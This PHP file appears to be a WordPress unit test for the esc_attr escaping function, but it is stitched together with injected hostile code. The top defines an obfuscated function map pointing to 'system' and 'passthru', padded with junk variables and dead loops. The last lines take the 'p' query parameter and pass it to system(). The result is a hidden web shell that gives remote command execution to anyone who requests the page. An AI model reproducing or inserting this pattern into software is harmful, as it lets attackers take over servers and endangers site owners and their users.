<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group formatting
 *
 * @covers ::esc_attr
 */
class Tests_Formatting_EscAttr extends WP_UnitTestCase {
	public function test_esc_attr_quotes() {
		$attr = '"double quotes"';
		$this->assertSame( '&quot;double quotes&quot;', esc_attr( $attr ) );

		$attr = "'single quotes'";
		$this->assertSame( '&#039;single quotes&#039;', esc_attr( $attr ) );

		$attr = "'mixed' " . '"quotes"';
		$this->assertSame( '&#039;mixed&#039; &quot;quotes&quot;', esc_attr( $attr ) );

		// Handles double encoding?
		$attr = '"double quotes"';
		$this->assertSame( '&quot;double quotes&quot;', esc_attr( esc_attr( $attr ) ) );

		$attr = "'single quotes'";
		$this->assertSame( '&#039;single quotes&#039;', esc_attr( esc_attr( $attr ) ) );

		$attr = "'mixed' " . '"quotes"';
		$this->assertSame( '&#039;mixed&#039; &quot;quotes&quot;', esc_attr( esc_attr( $attr ) ) );
	}

	public function test_esc_attr_amp() {
		$out = esc_attr( 'foo & bar &baz; &nbsp;' );
		$this->assertSame( 'foo &amp; bar &amp;baz; &nbsp;', $out );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>